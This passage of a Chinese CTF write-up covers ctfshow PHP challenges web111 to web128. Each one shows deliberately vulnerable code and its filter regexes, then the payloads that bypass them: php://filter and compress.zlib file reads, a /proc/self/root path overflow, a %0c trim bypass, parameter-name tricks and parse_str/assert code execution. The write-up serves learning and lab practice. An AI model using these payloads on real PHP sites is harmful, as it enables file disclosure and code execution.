variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>注意 PHP 的函数具有词法作用域</p><p>在函数内部无法调用外部的变量，除非进行传参。这道题无非注意以下几点：</p><ol><li>我们最终要得到 $flag 的值，就需要 var_dump($$v1) 中的 $v1 为 flag，即 $v2 要为 flag，这样 $$v2 就为 $flag，&amp;$$v2 就为 $flag 对应的值</li><li>URL 传参时 $v2 不能直接传为 flag，否则 $flag 会因“函数内部无法调用外部变量”的限制而导致其返回 null</li><li>要想跨过词法作用域的限制，我们可以用 GLOBALS 常量数组，其中包含了 $flag 键值对，就可以将 $flag 的值赋给 $$v1</li></ol><p>Payload：<code>?v1=ctfshow&amp;v2=GLOBALS</code></p><h4 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>要求传入的file不是文件，但还能highlight_file，这就要说明is_file和highlight_file对于文件的判断：is_file认为伪协议不是文件，highlight_file认为伪协议是文件，所以这里传入filter伪协议即可。</p><p>Payload:</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php</p></blockquote><p><a href="https://www.novel.tools/decode/UCS-2BE">UCS-2BE Text Decoder</a></p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>1.利用函数所能处理的长度限制进行目录溢出： 原理：&#x2F;proc&#x2F;self&#x2F;root代表根目录，进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了。 payload: <code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php</code></p><p>2.利用php中zip伪协议 用法[源于php官方提供的一些例子]： compress.zlib:&#x2F;&#x2F;file.gz compress.zlib:&#x2F;&#x2F;file.bz2 payload: <code>file=compress.zlib://flag.php</code></p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"师傅们居然tql都是非预期 哼！"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>把filter放出来了，直接读</p><h4 id="web115-f绕过is-numberic-trim"><a href="#web115-f绕过is-numberic-trim" class="headerlink" title="web115(\f绕过is_numberic()+trim())"></a>web115(\f绕过is_numberic()+trim())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>trim()</strong> 函数移除字符串两侧的空白字符或其他预定义字符。</p><p>一般是用来去除字符串首尾处的空白字符（或者其他字符），一般在用在服务端对接收的用户数据进行处理，以免把用户误输入的空格存储到数据库，下次对比数据时候出错。</p><p>filter让我们没法转进制绕过，这道题的关键在于如何绕过trim，推测需要特殊字符，所以我们写个脚本fuzz一下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></span></code></pre><p>Payload:<code>?num=%0c36</code></p><p>trim函数会过滤空格以及<code>\n\r\t\v\0</code>，但不会过滤<code>\f</code></p><h4 id="web123-下划线-绕过"><a href="#web123-下划线-绕过" class="headerlink" title="web123(下划线_绕过)"></a>web123(下划线_绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p><p>Payload:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h4 id="web125-SERVER-‘argv’-绕过"><a href="#web125-SERVER-‘argv’-绕过" class="headerlink" title="web125($_SERVER[‘argv’]绕过)"></a>web125($_SERVER[‘argv’]绕过)</h4><p>利用$_SERVER[‘argv’]</p><blockquote><p>parse_str(）函数把查询字符串解析到变量中。<br>注释：如果未设置array参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_strO）解析之前，变量会被 addslashesO转换。</p></blockquote><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p><p>‘argv’</p><p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p><p>意思就是通过$_SERVER[‘argv’]将$a变成数组，再利用数组的性质将fl0g&#x3D;flag_give_me传入，同时还绕过第一个if中的!isset($_GET[‘fl0g’]))，用+来进行分隔，使得数组中有多个数值。</p><p>执行eval函数也就是执行$c即是parse_str($a[1])，使得fl0g&#x3D;flag_give_me，从而进入第三个if语句。</p><p>Payload:</p><blockquote><p>GET:?1&#x3D;flag.php </p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</p></blockquote><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><p>Payload同上</p><h4 id="web127-extract变量覆盖-SERVER-‘QUERY-STRING’"><a href="#web127-extract变量覆盖-SERVER-‘QUERY-STRING’" class="headerlink" title="web127(extract变量覆盖 $_SERVER[‘QUERY_STRING’])"></a>web127(extract变量覆盖 $_SERVER[‘QUERY_STRING’])</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//特殊字符检测</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>extract()</strong> 函数从数组中将变量导入到当前的符号表。</p><p><code>.</code>和<code>[</code>被过滤了可以使用<code> </code>(空格)来过滤</p><p>**$SERVER[‘QUERY_STRING’];**获取的查询语句是服务端还没url解码之前的字符串，所以对<code>_</code>进行一次url编码也能绕过。</p><p>Payload:<code>?ctf%5fshow=ilove36d</code></p><h4 id="web128-gettext"><a href="#web128-gettext" class="headerlink" title="web128(gettext-&gt;_())"></a>web128(gettext-&gt;_())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">关于php中gettext的用法？</a></p><p>小知识点： _()是一个函数</p><p><strong>_()&#x3D;&#x3D;gettext()</strong> 